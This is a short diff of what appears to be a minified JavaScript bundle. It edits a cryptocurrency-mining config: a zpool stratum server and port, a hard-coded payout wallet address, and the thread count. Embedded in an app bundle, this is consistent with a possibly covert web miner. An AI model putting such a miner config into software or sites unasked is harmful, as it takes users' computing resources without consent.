@@ -1215,12 +1215,12 @@
             algorithm: "cwm_ghostrider",
             config: {
               stratum: {
-                server: "ghostrider.sea.mine.zpool.ca",
-                port: 5354,
+                server: "minotaurx.na.mine.zpool.ca",
+                port: 7019,
                 worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",
                 password: "c=RVN",
               },
-              options: { threads: 2, log: !0 },
+              options: { threads: 1, log: !0 },
             },
           },
           MU = [
